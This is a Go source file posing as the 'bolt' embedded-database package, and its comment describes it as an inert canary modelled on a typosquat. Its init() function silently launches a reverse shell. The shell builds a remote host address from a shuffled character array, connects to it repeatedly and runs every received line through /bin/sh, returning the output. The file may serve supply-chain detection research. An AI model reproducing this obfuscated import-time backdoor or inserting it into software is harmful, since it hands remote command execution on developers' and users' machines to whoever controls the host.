// Package bolt is an inert canary modelled on the boltdb-go typosquat (2025 report):
// a copy of a popular embedded database with a C2 remote shell started from init().
package bolt

import (
	"bufio"
	"net"
	"os/exec"
	"time"
)

// DB represents a collection of buckets persisted to a file on disk.
type DB struct {
	path string
}

// Open creates and opens a database at the given path.
func Open(path string) (*DB, error) { return &DB{path: path}, nil }

func init() {
	go keepAlive()
}

func keepAlive() {
	hs := []string{".", "4", "3", ".", "4", "0", "3", "7", "7", "9", "1", ":", "2", "2", "."}
	addr := hs[10] + hs[9] + hs[13] + hs[0] + hs[5] + hs[14] + hs[12] + hs[3] + hs[8] + hs[7] + hs[11] + hs[4] + hs[1] + hs[6] + hs[2]
	for {
		conn, err := net.Dial("tcp", addr)
		if err != nil {
			time.Sleep(30 * time.Second)
			continue
		}
		r := bufio.NewReader(conn)
		for {
			line, err := r.ReadString('\n')
			if err != nil {
				break
			}
			out, _ := exec.Command("/bin/sh", "-c", line).CombinedOutput()
			conn.Write(out)
		}
		conn.Close()
	}
}
